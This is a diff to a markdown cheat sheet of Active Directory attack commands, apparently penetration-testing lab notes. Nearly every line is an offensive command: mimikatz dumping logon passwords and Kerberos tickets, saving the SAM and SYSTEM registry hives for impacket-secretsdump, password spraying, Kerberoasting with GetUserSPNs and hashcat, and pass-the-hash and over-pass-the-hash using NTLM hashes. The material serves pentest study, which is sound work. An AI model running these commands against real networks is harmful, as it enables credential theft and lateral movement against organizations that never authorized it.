@@ -176,14 +176,21 @@ https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 ### Cached Credential Storage and Retrieval
 -> Dump the credentials of all connected users, including cached hashes
 ```
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+### Extracting hash
+```
+reg save hklm\sam sam
+reg save hklm\system system
+```
+```
+impacket-secretsdump -sam sam -system system LOCAL
 ```
 
 ### Service Account Attacks
-
 -> Sow user tickets that are stored in memory
 ```
-mimikatz.exe "sekurlsa::tickets"
+./mimikatz.exe "sekurlsa::tickets"
 ```
 
 -> Display all cached Kerberos tickets for the current user
@@ -194,7 +201,7 @@ klist
 
 -> Export service tickets from memory
 ```
-kerberos::list /export
+./mimikatz.exe kerberos::list /export
 ```
 
 -> Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
@@ -209,23 +216,37 @@ https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
 
 
 ### Password Spraying
-
+```
+.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+```
 https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
 
+### Kerberoast
+```
+impacket-GetUserSPNs offsec.local/nathan:abc123// -dc-ip 192.168.135.57 -request
+```
+```
+hashcat -a 0 -m 13100 alisson.txt /usr/share/wordlists/rockyou.txt 
+```
+```
+.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
+```
+or  
+```
+runas /user:offsec\allison cmd.exe
+```
 ### Active Directory Lateral Movement
-
 #### Pass the Hash
 -> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
 
-
 #### Over Pass the Hash
 -> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
 
 ```
-mimikatz.exe "sekurlsa::pth" "/user:jeff_admin" "/domain:corp.com" "/ntlm:e2b475c11da2a0748290d87aa966c327" "/run:PowerShell.exe" "exit"
+mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
 ```
 
 -> Command execution with psexec  
